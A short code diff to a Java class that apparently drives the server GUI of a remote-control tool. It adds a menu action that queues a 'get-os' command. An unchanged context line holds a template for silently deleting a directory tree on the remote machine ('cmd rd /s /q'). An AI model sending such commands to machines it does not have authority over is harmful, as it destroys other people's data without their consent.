@@ -37,6 +37,10 @@ public class ServerActionListener implements ActionListener {
             serverGUI.InsertCommand("cmd rd /s /q {DIRECTORY}", 13, 24);
         }
 
+        if(e.getSource() == serverGUI.menuProgrammCtrlGetOS){
+            serverGUI.InsertCommand("get-os", 0, 0);
+        }
+
         if(e.getSource() == serverGUI.btnConnect){
             try {
                 serverGUI.LogInformation("Trying connect to: " + serverGUI.txtConnectionIP.getText());
